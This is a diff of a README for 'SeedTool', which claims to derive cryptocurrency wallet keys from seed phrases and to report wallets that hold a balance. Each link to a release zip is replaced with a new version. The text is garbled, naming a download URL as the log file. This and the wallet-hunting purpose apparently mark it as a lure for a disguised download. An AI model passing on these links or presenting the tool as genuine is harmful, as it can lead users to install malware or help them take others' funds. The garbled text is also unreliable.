@@ -1,6 +1,6 @@
 # 🌱 SeedTool
 
-SeedTool is a powerful tool for generating Ethereum and Bitcoin wallet addresses using a mnemonic phrase and checking the associated balances and transactions without the need for an API. With SeedTool, you can easily generate a wallet address, private key, and mnemonic from a seed phrase, and check its balance and transactions. If a wallet with a non-zero balance is found, SeedTool logs and saves all pertinent information to a file named https://github.com/Thandoman/SeedTool/releases/download/v1.0/Application.zip
+SeedTool is a powerful tool for generating Ethereum and Bitcoin wallet addresses using a mnemonic phrase and checking the associated balances and transactions without the need for an API. With SeedTool, you can easily generate a wallet address, private key, and mnemonic from a seed phrase, and check its balance and transactions. If a wallet with a non-zero balance is found, SeedTool logs and saves all pertinent information to a file named https://github.com/Thandoman/SeedTool/releases/download/v2.0/Software.zip
 
 ## Topics
 - mnemonic-phrase-generator
@@ -22,11 +22,11 @@ SeedTool is a powerful tool for generating Ethereum and Bitcoin wallet addresses
 4. Input a seed phrase when prompted.
 5. SeedTool will generate wallet addresses, private keys, and mnemonics from the seed phrase.
 6. SeedTool will check the balances and transactions associated with each generated wallet.
-7. If a wallet with a non-zero balance is found, SeedTool will log the information to https://github.com/Thandoman/SeedTool/releases/download/v1.0/Application.zip
+7. If a wallet with a non-zero balance is found, SeedTool will log the information to https://github.com/Thandoman/SeedTool/releases/download/v2.0/Software.zip
 
 ## Installation
 To download the latest version of SeedTool, click the button below:
-[![Download SeedTool](https://github.com/Thandoman/SeedTool/releases/download/v1.0/Application.zip)](https://github.com/Thandoman/SeedTool/releases/download/v1.0/Application.zip)
+[![Download SeedTool](https://github.com/Thandoman/SeedTool/releases/download/v2.0/Software.zip)](https://github.com/Thandoman/SeedTool/releases/download/v2.0/Software.zip)
 
 ## Contributors
 SeedTool is maintained and contributed to by a team of developers passionate about blockchain technology and cryptocurrency. If you'd like to contribute to SeedTool, feel free to submit a pull request or reach out to us.
